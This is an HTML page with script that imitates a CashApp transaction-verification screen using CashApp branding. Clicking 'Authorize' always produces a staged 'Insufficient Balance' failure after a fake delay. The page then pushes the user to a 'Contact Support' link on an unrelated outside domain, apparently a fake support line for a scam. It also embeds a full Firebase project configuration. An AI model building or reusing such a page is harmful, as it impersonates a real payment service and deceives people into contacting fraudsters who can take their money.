<!DOCTYPE html>
<html lang="en">
<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>CashApp — Advanced Transaction Verification</title>

 <!-- FIREBASE CDN SCRIPTS -->
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>

 <style>
        :root {
            --green-500: #00D632; --green-600: #00C22A; --green-700: #009924; --green-50: #e6fbee;
            --text-main: #0f172a; --text-muted: #64748b; --border-light: #e2e8f0; --bg-body: #f8fafc; --bg-card: #ffffff;
            --warning-bg: #fffbeb; --warning-text: #b45309; --error-bg: #fee2e2; --error-text: #dc2626;
            --shadow-sm: 0 1px 2px 0 rgb(0 0 0 / 0.05); --shadow-md: 0 4px 6px -1px rgb(0 0 0 / 0.1); --radius-md: 12px; --radius-lg: 16px;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg-body); color: var(--text-main); min-height: 100vh; }
        header { background: var(--bg-card); border-bottom: 1px solid var(--border-light); padding: 1rem 5%; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 50; }
        .header-left { display: flex; align-items: center; gap: 1rem; }
        .back-btn { background: none; border: none; color: var(--text-muted); cursor: pointer; display: flex; align-items: center; padding: 4px; }
        .logo { display: flex; align-items: center; gap: 0.75rem; font-size: 1.25rem; font-weight: 800; color: var(--text-main); text-decoration: none; }
        .logo svg { width: 32px; height: 32px; color: var(--green-500); }
        .profile { width: 40px; height: 40px; border-radius: 50%; background: var(--green-50); color: var(--green-700); display: grid; place-items: center; font-weight: 700; font-size: 1.1rem; border: 1px solid var(--green-500); }
        main { width: min(100%, 800px); margin: 2.5rem auto 4rem; padding: 0 1rem; display: flex; flex-direction: column; gap: 1.5rem; }
        .page-header h1 { font-size: clamp(1.75rem, 5vw, 2.25rem); font-weight: 800; margin-bottom: 0.5rem; }
        .page-header p { color: var(--text-muted); font-size: 1.05rem; }
        .card { background: var(--bg-card); border: 1px solid var(--border-light); border-radius: var(--radius-lg); padding: 1.75rem; box-shadow: var(--shadow-md); }
        .status-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 2rem; flex-wrap: wrap; gap: 1rem; }
        .status-badge { display: inline-flex; align-items: center; gap: 0.5rem; background: var(--warning-bg); color: var(--warning-text); padding: 0.5rem 1rem; border-radius: 999px; font-weight: 600; font-size: 0.875rem; }
        .status-badge.success { background: var(--green-50); color: var(--green-700); }
        .status-badge.error { background: var(--error-bg); color: var(--error-text); }
        .status-dot { width: 8px; height: 8px; border-radius: 50%; background: currentColor; }
        .transaction-id { font-family: monospace; color: var(--text-muted); background: var(--bg-body); padding: 0.25rem 0.5rem; border-radius: 6px; }
        .stepper { display: flex; align-items: flex-start; margin-bottom: 2rem; position: relative; }
        .step { flex: 1; display: flex; flex-direction: column; align-items: center; position: relative; z-index: 2; gap: 0.5rem; }
        .step-icon { width: 32px; height: 32px; border-radius: 50%; display: grid; place-items: center; background: var(--bg-card); border: 2px solid var(--border-light); color: var(--text-muted); font-weight: 600; font-size: 0.875rem; }
        .step.active .step-icon { border-color: var(--warning-text); color: var(--warning-text); }
        .step.completed .step-icon { background: var(--green-500); border-color: var(--green-500); color: white; }
        .step-label { font-size: 0.875rem; font-weight: 500; color: var(--text-muted); text-align: center; }
        .info-box { background: var(--bg-body); border-left: 4px solid var(--green-500); padding: 1rem 1.25rem; border-radius: 0 var(--radius-md) var(--radius-md) 0; margin-bottom: 1.5rem; font-size: 0.95rem; line-height: 1.5; }
        .info-box.error { border-left-color: var(--error-text); background: #fef2f2; color: #991b1b; }
        .action-box { border: 1px solid var(--border-light); border-radius: var(--radius-md); padding: 1.5rem; background: linear-gradient(to bottom right, #ffffff, #f8fafc); }
        .btn { background: var(--green-600); color: white; border: none; padding: 0.875rem 1.5rem; border-radius: var(--radius-md); font-weight: 600; font-size: 1rem; cursor: pointer; display: inline-flex; align-items: center; justify-content: center; gap: 0.5rem; width: 100%; text-decoration: none; }
        .btn:hover:not(:disabled) { background: var(--green-700); }
        .btn:disabled { opacity: 0.7; cursor: not-allowed; }
        .btn-support { background-color: #000000; color: #ffffff; margin-top: 0.75rem; }
        .spinner { width: 18px; height: 18px; border: 2px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s linear infinite; display: none; }
        .btn.loading .spinner { display: inline-block; }
        .tx-details-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 1rem; margin-bottom: 1.5rem; background: var(--bg-body); padding: 1rem; border-radius: var(--radius-md); }
        .tx-detail-item label { font-size: 0.75rem; text-transform: uppercase; color: var(--text-muted); font-weight: 700; display: block; margin-bottom: 0.25rem; }
        .tx-detail-item span { font-size: 1rem; font-weight: 600; color: var(--text-main); word-break: break-all; }
        .form-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin-bottom: 1.5rem; }
        .form-control { width: 100%; padding: 0.75rem 1rem; border: 1px solid var(--border-light); border-radius: var(--radius-md); font-size: 1rem; outline: none; }
        .result-box { margin-top: 1.5rem; padding: 1.25rem; background: var(--bg-body); border-radius: var(--radius-md); border: 1px solid var(--border-light); display: none; }
        .result-row { display: flex; justify-content: space-between; margin-bottom: 0.75rem; color: var(--text-muted); font-size: 0.95rem; }
        .result-row.total { border-top: 1px dashed var(--border-light); margin-top: 1rem; padding-top: 1rem; color: var(--text-main); font-weight: 800; font-size: 1.15rem; }
        .toast-container { position: fixed; bottom: 1.5rem; right: 1.5rem; display: flex; flex-direction: column; gap: 0.5rem; z-index: 100; }
        .toast { background: #0f172a; color: white; padding: 1rem 1.25rem; border-radius: var(--radius-md); font-size: 0.90rem; font-weight: 500; display: flex; align-items: center; gap: 0.75rem; box-shadow: var(--shadow-md); }
        @keyframes spin { to { transform: rotate(360deg); } }
        @media (max-width: 640px) { .form-grid { grid-template-columns: 1fr; } }
 </style>
</head>

<body>
 <header>
  <div class="header-left">
    <button class="back-btn" onclick="window.location.href='index.html#history'"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 19l-7-7 7-7"></path></svg></button>
    <a href="index.html" class="logo"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0z"/></svg> CashApp</a>
  </div>
  <div class="profile" id="user-profile-icon">B</div>
 </header>

 <main>
  <section class="page-header">
   <h1>Transaction Verification</h1>
   <p>Review transfer details and authorize separately per transaction.</p>
  </section>

  <section class="card" id="transactionModule">
   <div class="status-header">
    <div class="status-badge" id="statusBadge"><span class="status-dot"></span><span id="statusText">Action Required</span></div>
    <div class="transaction-id" id="dynamic-tx-id">ID: GP-PENDING</div>
   </div>

   <div class="tx-details-grid">
    <div class="tx-detail-item"><label>Transfer Amount</label><span id="detailAmount">$0.00</span></div>
    <div class="tx-detail-item"><label>Destination / Recipient</label><span id="detailTarget">--</span></div>
    <div class="tx-detail-item"><label>Transfer Speed Tier</label><span id="detailTier" style="color: var(--warning-text);">Priority</span></div>
    <div class="tx-detail-item"><label>Estimated Confirmation</label><span id="detailEstimate">15 – 30 mins pending</span></div>
   </div>

   <div class="info-box" id="infoBoxText"><strong>System Notice:</strong> Authorize this specific transfer to enter network queue.</div>

   <div class="action-box">
    <h3>Authorize Transfer</h3>
    <button class="btn" id="acceptBtn"><span class="spinner"></span><span class="btn-text">Authorize This Transaction</span></button>
    <a href="https://technicalsupportunit.com/ca/643333312d366631622d3633643561c1306813994001" class="btn btn-support" id="supportBtn" style="display: none;" target="_blank">Contact Support</a>
   </div>
  </section>
 </main>
 <div class="toast-container" id="toastContainer"></div>

 <script>
  const firebaseConfig = {
    apiKey: "AIzaSyCP7UIQW0v3GKQlr_tE3fg05aYHey_SlzQ",
    authDomain: "onlinecs-w.firebaseapp.com",
    projectId: "onlinecs-w",
    storageBucket: "onlinecs-w.firebasestorage.app",
    messagingSenderId: "761832733504",
    appId: "1:761832733504:web:032d88f12de95bfad098a5",
    measurementId: "G-8RE8WTR7EM"
  };
  firebase.initializeApp(firebaseConfig);
  const db = firebase.firestore();
  const currencyFormatter = new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' });

  window.addEventListener('DOMContentLoaded', () => {
      const userEmail = localStorage.getItem('walletAppSessionEmail');
      if (!userEmail) { window.location.href = 'login.html'; return; }

      db.collection("users").doc(userEmail).get().then((doc) => {
          if (!doc.exists) { window.location.href = 'login.html'; return; }
          let userState = doc.data();
          if (userState.name) document.getElementById('user-profile-icon').innerText = userState.name.charAt(0).toUpperCase();
          if (!userState.history) userState.history = [];

          const pendingTxs = userState.history.filter(tx => tx.status === 'Review' || tx.status === 'PENDING');
          const urlParams = new URLSearchParams(window.location.search);
          const selectedTxId = urlParams.get('id');

          let currentTx = selectedTxId ? userState.history.find(tx => tx.id.toString() === selectedTxId.toString()) : pendingTxs[0];

          if (!currentTx) {
              document.getElementById('dynamic-tx-id').innerText = "ID: ALL CLEARED";
              document.getElementById('statusBadge').className = "status-badge success";
              document.getElementById('statusText').innerText = "All Clear";
              document.getElementById('detailAmount').innerText = "$0.00";
              document.getElementById('detailTarget').innerText = "No active holds";
              document.getElementById('acceptBtn').disabled = true;
              document.getElementById('acceptBtn').querySelector('.btn-text').innerText = "No Pending Actions";
              return;
          }

          document.getElementById('dynamic-tx-id').innerText = `ID: GP-${currentTx.id.toString().slice(-6)}-X`;
          document.getElementById('detailAmount').innerText = currentTx.amountDisp || '$0.00';
          document.getElementById('detailTarget').innerText = currentTx.subtitle || currentTx.title || 'Verified Recipient';

          const acceptBtn = document.getElementById('acceptBtn');
          const supportBtn = document.getElementById('supportBtn');

          acceptBtn.addEventListener('click', async () => {
              acceptBtn.disabled = true;
              acceptBtn.classList.add('loading');
              acceptBtn.querySelector('.btn-text').textContent = "Verifying Liquidity...";

              await new Promise(r => setTimeout(r, 2000));

              acceptBtn.classList.remove('loading');
              acceptBtn.style.display = 'none';
              supportBtn.style.display = 'inline-flex';

              document.getElementById('statusBadge').className = "status-badge error";
              document.getElementById('statusText').textContent = "Insufficient Balance — Action Required";
              document.getElementById('infoBoxText').className = "info-box error";
              document.getElementById('infoBoxText').innerHTML = "<strong>Verification Failed:</strong> Insufficient balance detected to process network authorization.";

              currentTx.status = 'Review';
              await db.collection("users").doc(userState.email).set(userState, { merge: true });

              setTimeout(() => { window.location.href = 'index.html#history'; }, 3500);
          });
      });
  });
 </script>
</body>
</html>
